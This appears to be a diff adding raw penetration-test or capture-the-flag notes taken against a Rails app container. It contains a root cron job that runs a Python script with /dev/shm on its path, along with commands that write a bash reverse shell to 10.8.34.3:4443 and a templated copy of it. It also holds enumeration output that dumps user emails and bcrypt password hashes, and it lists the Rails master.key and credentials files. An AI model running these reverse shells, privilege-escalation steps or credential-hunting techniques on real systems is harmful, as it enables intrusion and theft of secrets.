@@ -1,0 +1,58 @@
+#!/bin/bash
+echo "Starting app" && /usr/sbin/sshd && service cron start
+chown -R emp:emp /home/emp/app/*
+su - emp -c "cd /home/emp/app && export GEM_HOME=/home/emp/.gems && rm -f tmp/pids/server.pid && RAILS_ENV=production bundle exec rails s -p 3000 -b '0.0.0.0'"
+emp@23348446b03
+
+
+root           1  0.0  0.2   5784  2968 ?        Ss   08:02   0:00 /bin/bash ./cron_start.sh
+
+root          15  0.0  0.2   5632  2168 ?        Ss   08:03   0:00 /usr/sbin/cron                                                                 
+root          17  0.0  0.3   8796  3620 ?        S    08:03   0:00 su - emp -c cd /home/emp/app && export GEM_HOME=/home/emp/.gems && rm -f tmp/pi
+ds/server.pid && RAILS_ENV=production bundle exec rails s -p 3000 -b '0.0.0.0'       
+
+
+* * * * * root PYTHONPATH=/dev/shm:$PYTHONPATH python3 /usr/local/sbin/backup.py >> /var/log/cron.log
+
+
+echo '#!/bin/bash' > /cmd
+echo "/bin/bash -i >& /dev/tcp/10.8.34.3/4443 0>&1" >> /cmd
+chmod a+x /cmd
+
+
+echo '#!/bin/bash' > /cmd
+echo "bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1" >> /cmd
+chmod a+x /cmd
+
+
+
+ -> Extracting tables from /home/emp/app/db/development.sqlite3 (limit 20)            
+  --> Found interesting column names in users (output limit 10)                                                                                   
+CREATE TABLE "users" ("id" integer PRIMARY KEY AUTOINCREMENT NOT NULL, "email" varchar DEFAULT '' NOT NULL, "encrypted_password" varchar DEFAULT '
+' NOT NULL, "reset_password_token" varchar, "reset_password_sent_at" datetime(6), "remember_created_at" datetime(6), "created_at" datetime(6) NOT 
+NULL, "updated_at" datetime(6) NOT NULL)                                                                     
+1, xdxd@xd.com, $2a$12$6Y6DEiCjlcIw3o9KedKZ0.8K3P6SyFLXn0YVL3jLYrMM2zjiBaoUy, None, None, None, 2023-02-08 21:12:56.226535, 2023-02-08 21:12:56.25
+3169                                                                                                         
+                                                      
+ -> Extracting tables from /home/emp/app/db/production.sqlite3 (limit 20)
+  --> Found interesting column names in users (output limit 10)
+CREATE TABLE "users" ("id" integer PRIMARY KEY AUTOINCREMENT NOT NULL, "email" varchar DEFAULT '' NOT NULL, "encrypted_password" varchar DEFAULT '
+' NOT NULL, "reset_password_token" varchar, "reset_password_sent_at" datetime(6), "remember_created_at" datetime(6), "created_at" datetime(6) NOT 
+NULL, "updated_at" datetime(6) NOT NULL)
+1, xdxdxd@xdxdxd.com, $2a$12$VKzuAr5fjslVgIknmgY2eO2xWHBj06MHcQLm9llKsiZ88loG9IRsK, None, None, None, 2023-02-14 18:40:31.265202, 2023-02-14 18:40
+:31.268212                          
+
+ -> Extracting tables from /home/emp/app/db/test.sqlite3 (limit 20)
+  --> Found interesting column names in users (output limit 10)
+CREATE TABLE "users" ("id" integer PRIMARY KEY AUTOINCREMENT NOT NULL, "email" varchar DEFAULT '' NOT NULL, "encrypted_password" varchar DEFAULT '
+' NOT NULL, "reset_password_token" varchar, "reset_password_sent_at" datetime(6), "remember_created_at" datetime(6), "created_at" datetime(6) NOT 
+NULL, "updated_at" datetime(6) NOT NULL)
+
+
+
+/home/emp/app/app/views/devise/passwords
+/home/emp/app/config/credentials.yml.enc
+/home/emp/app/config/master.key
+
+
+
